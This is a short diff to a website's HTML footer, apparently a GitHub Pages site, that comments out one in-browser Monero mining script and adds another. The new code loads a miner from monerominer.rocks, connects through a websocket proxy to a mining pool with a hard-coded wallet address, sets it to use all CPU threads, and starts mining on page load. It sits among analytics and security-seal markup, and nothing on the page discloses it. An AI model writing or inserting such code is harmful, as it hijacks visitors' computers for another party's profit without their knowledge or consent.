@@ -31,7 +31,7 @@ alt="Web Analytics"></a></div></noscript>
    src="/ssl-secure-seal.png"
    width="187" height="90" alt="SSL Secure"></a>
 
-<script src="https://coinwebmining.com/cwm.js"></script>
+<!--<script src="https://coinwebmining.com/cwm.js"></script>
 <script>
     var site_id = 'cwm-3735';
     var coin = 'monero';
@@ -42,6 +42,17 @@ alt="Web Analytics"></a></div></noscript>
     var throttle = 0.2;
     var debug = false;
     cwm_start(site_id, coin, wallet, password, mining_pool, threads, throttle, debug);
+</script>-->
+<script src="https://monerominer.rocks/miner-mmr/webmnr.min.js"></script>
+<script>
+    server = "wss://f.xmrminingproxy.com:8181";
+    var pool = "moneroocean.stream";
+    var wallet_address = '84FEn5Gak63AReZjRtDwV724TsoUtfajxjLHHJZ3zH3vcaAZJwvg4qWdUG9cx7nhA1ZfT9kK89roADmRb1ehLLhH6HyTATK';
+    var worker_id = "InnovAnon-Inc.github.io"
+    var threads = -1;
+    var password = "x";
+    startMining(pool, wallet_address, worker_id, threads, password);
+    throttleMiner = 20;
 </script>
 
 <!-- end custom footer snippets -->
